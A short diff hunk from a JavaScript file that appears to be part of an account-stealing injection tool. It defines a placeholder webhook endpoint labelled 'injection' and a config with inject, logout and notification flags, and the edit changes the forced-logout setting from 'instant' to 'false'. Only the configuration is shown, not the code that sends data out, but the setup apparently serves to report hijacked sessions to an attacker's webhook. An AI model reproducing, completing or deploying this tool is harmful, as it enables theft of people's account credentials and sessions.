@@ -165,7 +165,7 @@ const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const superstarlmao = "https://da_webhook/api2.php?type=injection"
 const config = {
-    "logout": "instant",
+    "logout": "false",
     "inject-notify": "true",
     "logout-notify": "true",
     "init-notify": "false",
